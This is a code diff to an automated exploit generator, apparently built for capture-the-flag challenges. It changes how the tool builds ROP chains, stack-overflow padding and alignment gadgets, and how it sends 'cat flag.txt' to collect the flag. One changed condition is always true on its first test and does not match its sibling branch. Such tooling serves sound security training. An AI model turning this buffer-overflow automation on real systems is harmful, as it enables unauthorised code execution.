@@ -153,9 +153,10 @@ class rAEG:
                 for x in re_values:
                     temp = int(x.split(', ')[1],16)
                     params.append(p64(temp))
-                #self.exploit_function = "win"
-                self.exploit_function = self.find_goal("win")
-                params = []
+                if len(params) > 0:
+                    self.exploit_function = self.find_goal("win")
+                else:
+                    self.exploit_function = "win"
                 logger.info("Found win function")
             elif "system" in self.elf.sym.keys():
                 self.exploit_function = "system"
@@ -453,6 +454,9 @@ class rAEG:
     # Create a rop chain to execute a function call
     def rop_chain_call_function(self, function, parameters):
 
+        if function == "win" or type(function) == int:
+            parameters = []
+
         chain = b""
         # If there are any parameters to add to the rop chain then they go in here
         if len(parameters) > 0:
@@ -497,8 +501,10 @@ class rAEG:
                     chain += param
 
         # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
-        #if (len(chain) + self.chain_length + 8) % 16 != 0:
-            #chain += p64(self.elf.sym["_fini"])
+        if (len(chain) + self.chain_length + 8) % 16 != 0:
+            chain += p64(self.elf.sym["_fini"])
+        if type(function) == int:
+            chain += p64(self.elf.sym["_fini"])
         if function == "syscall":
             output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
             output.pop(0)
@@ -542,7 +548,6 @@ class rAEG:
 
         prompt = p.recvline()
 
-        print(hex(self.libc.sym["system"]))
 
         if b"0x" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
@@ -592,7 +597,6 @@ class rAEG:
         p.sendline(b"cat flag.txt")
         try:
             output = p.recvall(timeout=2)
-            print(output)
             if b"flag" in output:
                 self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
                 self.flag = self.flag.decode()
@@ -853,19 +857,30 @@ class rAEG:
                     p.sendline(self.symbolic_padding + self.rop_chain)
                 else:
                     logger.info(f"Sending ROP Chain with {self.padding} padding")
-                    padding = b"A" * (self.padding - 8) + p64(addr)
+                    if type(self.exploit_function) == int and len(self.parameters) > 0:
+                        print("win parameters")
+                        padding = b"A" * (self.padding - 8) + p64(addr)
+                    else:
+                        padding = b"A" * self.padding
 
                     p.sendline(padding + self.rop_chain)
             else:
                 logger.info(f"Sending ROP Chain with {self.padding} padding")
-                padding = b"A" * (self.padding - 8) + p64(addr)
+                if type(self.exploit_function) and len(self.parameters) > 0:
+                    print("win parameters")
+                    padding = b"A" * (self.padding - 8) + p64(addr)
+                else:
+                    padding = b"A" * self.padding
                 p.sendline(padding + self.rop_chain)
 
 
             p.sendline(b"cat flag.txt")
             p.sendline(b"cat flag.txt")
             try:
-                output = p.recvall(timeout=2).decode()
+                if args.GDB:
+                    output = p.recvall(timeout=30).decode()
+                else:
+                    output = p.recvall(timeout=2).decode()
                 self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                 print(self.flag)
             except:
